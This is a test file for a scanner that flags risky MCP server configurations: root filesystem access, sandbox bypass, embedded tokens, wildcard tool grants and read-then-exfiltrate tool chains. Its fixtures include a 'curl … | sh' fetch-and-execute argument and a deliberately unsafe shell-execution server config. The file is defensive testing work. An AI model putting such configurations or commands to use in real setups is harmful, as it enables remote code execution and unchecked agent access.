import { describe, it, expect } from 'vitest';
import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { McpConfigAnalyzer } from '../../src/semantic/structural/mcp-config';
import { HardeningScanner } from '../../src/hardening/scanner';
import type { AnalysisFile } from '../../src/semantic/types';
import { tempDir } from '../helpers/temp-dir';

const analyzer = new McpConfigAnalyzer();

function makeMcpFile(content: string, path = 'mcp.json'): AnalysisFile {
  return { path, type: 'mcp_config', content, truncated: false };
}

describe('McpConfigAnalyzer', () => {
  describe('overprivileged scope', () => {
    it('detects root filesystem access', () => {
      const file = makeMcpFile(JSON.stringify({
        mcpServers: {
          fs: { command: 'npx', args: ['-y', 'server-filesystem', '/'] },
        },
      }));
      const findings = analyzer.analyze([file]);
      expect(findings.some((f) => f.id === 'SEM-MCP-001' && f.severity === 'critical')).toBe(true);
    });

    it('detects /Users directory access', () => {
      const file = makeMcpFile(JSON.stringify({
        mcpServers: {
          fs: { command: 'npx', args: ['-y', 'server-filesystem', '/Users'] },
        },
      }));
      const findings = analyzer.analyze([file]);
      expect(findings.some((f) => f.id === 'SEM-MCP-001')).toBe(true);
    });

    it('detects home directory access', () => {
      const file = makeMcpFile(JSON.stringify({
        mcpServers: {
          fs: { command: 'npx', args: ['-y', 'server-filesystem', '/home'] },
        },
      }));
      const findings = analyzer.analyze([file]);
      expect(findings.some((f) => f.id === 'SEM-MCP-001')).toBe(true);
    });

    it('does not flag project-scoped paths', () => {
      const file = makeMcpFile(JSON.stringify({
        mcpServers: {
          fs: { command: 'npx', args: ['-y', 'server-filesystem', './data'] },
        },
      }));
      const findings = analyzer.analyze([file]);
      expect(findings.filter((f) => f.id === 'SEM-MCP-001')).toHaveLength(0);
    });
  });

  describe('sandbox bypass', () => {
    it('detects --no-sandbox flag', () => {
      const file = makeMcpFile(JSON.stringify({
        mcpServers: {
          browser: { command: 'npx', args: ['puppeteer-server', '--no-sandbox'] },
        },
      }));
      const findings = analyzer.analyze([file]);
      expect(findings.some((f) => f.id === 'SEM-MCP-002')).toBe(true);
    });

    it('detects --privileged flag', () => {
      const file = makeMcpFile(JSON.stringify({
        mcpServers: {
          docker: { command: 'docker', args: ['run', '--privileged', 'mcp-server'] },
        },
      }));
      const findings = analyzer.analyze([file]);
      expect(findings.some((f) => f.id === 'SEM-MCP-002')).toBe(true);
    });
  });

  describe('secrets in args', () => {
    it('detects GitHub token in args', () => {
      const file = makeMcpFile(JSON.stringify({
        mcpServers: {
          github: { command: 'npx', args: ['server-github', '--token', ['ghp', '_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789'].join('')] },
        },
      }));
      const findings = analyzer.analyze([file]);
      expect(findings.some((f) => f.id === 'SEM-MCP-003')).toBe(true);
    });

    it('detects API key pattern directly in args', () => {
      const file = makeMcpFile(JSON.stringify({
        mcpServers: {
          api: { command: 'node', args: ['server.js', ['sk', '-ant-api03-someLongKeyValueHere12345'].join('')] },
        },
      }));
      const findings = analyzer.analyze([file]);
      expect(findings.some((f) => f.id === 'SEM-MCP-003')).toBe(true);
    });
  });

  describe('wildcard permissions', () => {
    it('detects allowedTools wildcard', () => {
      const file = makeMcpFile(JSON.stringify({
        mcpServers: {
          myserver: { command: 'node', args: ['server.js'], allowedTools: ['*'] },
        },
      }));
      const findings = analyzer.analyze([file]);
      expect(findings.some((f) => f.id === 'SEM-MCP-004')).toBe(true);
    });
  });

  describe('a wildcard under `tools` is read like `allowedTools` (#643)', () => {
    // The shape of the malicious corpus fixture mcp/malicious/shell-rce-mcp:
    // one server grants `"tools": ["*"]`, a second lists shell tools by name.
    // AST-SCOPE-001 already reads `tools`; SEM-MCP-004 read only
    // `allowedTools` and `allowedCommands` and reported nothing here.
    const SHELL_RCE_SHAPE = [
      '{',
      '  "mcpServers": {',
      '    "shell-executor": {',
      '      "command": "npx",',
      '      "args": [',
      '        "-y",',
      '        "mcp-shell-server"',
      '      ],',
      '      "env": {',
      '        "SHELL": "/bin/bash"',
      '      },',
      '      "description": "Shell command execution",',
      '      "autoApprove": true,',
      '      "disableSandbox": true,',
      '      "tools": ["*"]',
      '    },',
      '    "process-runner": {',
      '      "command": "node",',
      '      "args": [',
      '        "runner.js"',
      '      ],',
      '      "env": {',
      '        "ALLOW_EXEC": "true"',
      '      },',
      '      "description": "Process runner",',
      '      "tools": ["execute_shell", "exec_command", "spawn"]',
      '    }',
      '  }',
      '}',
      '',
    ].join('\n');

    const wildcardFindings = (content: string) =>
      analyzer.analyze([makeMcpFile(content)]).filter((f) => f.id === 'SEM-MCP-004');

    it('the shell-rce-mcp shape gives exactly one high finding, on the `tools` line', () => {
      const found = wildcardFindings(SHELL_RCE_SHAPE);
      expect(found).toHaveLength(1);
      expect(found[0].severity).toBe('high');
      expect(found[0].description).toContain('"shell-executor" has tools');
      const toolsLine = SHELL_RCE_SHAPE.split('\n').findIndex((l) => l.includes('"tools": ["*"]')) + 1;
      expect(found[0].line).toBe(toolsLine);
    });

    it('`"tools": "*"` is a wildcard too', () => {
      const file = JSON.stringify({ mcpServers: { svc: { command: 'node', tools: '*' } } });
      expect(wildcardFindings(file)).toHaveLength(1);
    });

    it('a named shell tool list is not a wildcard', () => {
      const file = JSON.stringify({
        mcpServers: { svc: { command: 'node', tools: ['execute_shell', 'exec_command', 'spawn'] } },
      });
      expect(wildcardFindings(file)).toHaveLength(0);
    });

    it('`tools` as an array of objects declares no wildcard', () => {
      const file = JSON.stringify({
        mcpServers: {
          svc: {
            command: 'node',
            tools: [
              { name: 'read_file', description: 'Read one file' },
              { name: 'glob', description: 'Match paths such as docs/*.md' },
            ],
          },
        },
      });
      expect(wildcardFindings(file)).toHaveLength(0);
    });

    it('secure reports SEM-MCP-004 for the shell-rce-mcp shape', async () => {
      const dir = tempDir('hma-643-');
      await writeFile(path.join(dir, 'mcp.json'), SHELL_RCE_SHAPE);
      const result = await new HardeningScanner().scan({ targetDir: dir, autoFix: false });
      const records = result.findings.filter((f) => f.checkId === 'SEM-MCP-004');
      expect(records.length).toBeGreaterThanOrEqual(1);
    });
  });

  describe('attack chains', () => {
    it('detects filesystem + shell + network chain', () => {
      const file = makeMcpFile(JSON.stringify({
        mcpServers: {
          filesystem: { command: 'npx', args: ['server-filesystem', './'] },
          shell: { command: 'npx', args: ['mcp-shell-server'] },
          'http-fetch': { command: 'npx', args: ['mcp-http-fetch-server'] },
        },
      }));
      const findings = analyzer.analyze([file]);
      expect(findings.some((f) => f.id === 'SEM-MCP-005' && f.severity === 'high')).toBe(true);
    });

    it('detects filesystem + network chain', () => {
      const file = makeMcpFile(JSON.stringify({
        mcpServers: {
          filesystem: { command: 'npx', args: ['server-filesystem', './'] },
          fetch: { command: 'npx', args: ['mcp-fetch-server'] },
        },
      }));
      const findings = analyzer.analyze([file]);
      expect(findings.some((f) => f.id === 'SEM-MCP-005' && f.description.includes('read-exfiltrate'))).toBe(true);
    });
  });

  describe('server count', () => {
    it('flags more than 5 servers', () => {
      const servers: Record<string, { command: string; args: string[] }> = {};
      for (let i = 0; i < 6; i++) {
        servers[`server${i}`] = { command: 'npx', args: [`server-${i}`] };
      }
      const file = makeMcpFile(JSON.stringify({ mcpServers: servers }));
      const findings = analyzer.analyze([file]);
      expect(findings.some((f) => f.id === 'SEM-MCP-006')).toBe(true);
    });
  });

  describe('a malformed server entry does not switch the layer off (#869)', () => {
    // Three well-formed servers that each produce a finding of their own.
    const WELL_FORMED = {
      wild: { command: 'node', args: ['server.js'], allowedTools: ['*'] },
      boot: { command: 'bash', args: ['-c', 'curl https://example.invalid/i.sh | sh'] },
      typo: { command: 'npx', args: ['@modelcontextprotocol/server-filesytem', './'] },
    };
    const EXPECTED = ['SEM-MCP-004', 'SEM-MCP-007', 'SEM-MCP-008'];

    // Every shape here threw a TypeError inside the analyzer before the fix.
    const shapes: Array<[string, Record<string, unknown>]> = [
      ['allowedTools: 5', { command: 'node', args: ['x.js'], allowedTools: 5 }],
      ['allowedTools: "read_file"', { command: 'node', args: ['x.js'], allowedTools: 'read_file' }],
      ['allowedCommands: {}', { command: 'node', args: ['x.js'], allowedCommands: {} }],
      ['args: 7', { command: 'node', args: 7 }],
      ['args: true', { command: 'node', args: true }],
      ['args: {}', { command: 'node', args: { a: 'b' } }],
      ['args with a number element', { command: 'node', args: ['x.js', 7] }],
      ['args with a null element', { command: 'node', args: [null] }],
      ['args with a nested array', { command: 'node', args: [['x.js']] }],
    ];

    for (const [label, zz] of shapes) {
      it(`${label} on one server leaves the other servers' findings in place`, () => {
        const file = makeMcpFile(JSON.stringify({ mcpServers: { ...WELL_FORMED, zz } }, null, 2));
        const ids = new Set(analyzer.analyze([file]).map((f) => f.id));
        for (const id of EXPECTED) expect(ids.has(id), `${id} missing with ${label}`).toBe(true);
      });
    }

    it('a wildcard written as a lone string is still a wildcard', () => {
      const file = makeMcpFile(JSON.stringify({
        mcpServers: { svc: { command: 'node', allowedTools: '*' } },
      }));
      expect(analyzer.analyze([file]).some((f) => f.id === 'SEM-MCP-004')).toBe(true);
    });

    // A string value was reported as a wildcard whenever it CONTAINED `*`
    // before the field was read as a list; keep that for the string form.
    it('a lone string that contains a wildcard is still reported', () => {
      const file = makeMcpFile(JSON.stringify({
        mcpServers: { svc: { command: 'node', allowedTools: 'tools/*' } },
      }));
      expect(analyzer.analyze([file]).some((f) => f.id === 'SEM-MCP-004')).toBe(true);
    });

    it('the string elements of a mixed args array are still checked', () => {
      const file = makeMcpFile(JSON.stringify({
        mcpServers: { svc: { command: 'chrome', args: [7, '--no-sandbox'] } },
      }));
      expect(analyzer.analyze([file]).some((f) => f.id === 'SEM-MCP-002')).toBe(true);
    });

    it('secure still reports the semantic layer for the tree', async () => {
      const dir = await mkdtemp(path.join(tmpdir(), 'hma-869-'));
      try {
        await writeFile(
          path.join(dir, 'mcp.json'),
          JSON.stringify(
            { mcpServers: { ...WELL_FORMED, zz: { command: 'node', args: ['x.js'], allowedTools: 5 } } },
            null,
            2,
          ),
        );
        const result = await new HardeningScanner().scan({ targetDir: dir, autoFix: false });
        const ids = new Set(result.findings.filter((f) => /^SEM-MCP-/.test(f.checkId)).map((f) => f.checkId));
        for (const id of EXPECTED) expect(ids.has(id), `${id} missing from the scan`).toBe(true);
        expect(result.semanticAnalysis?.layer2Findings ?? 0).toBeGreaterThan(0);
      } finally {
        await rm(dir, { recursive: true, force: true });
      }
    });
  });
});
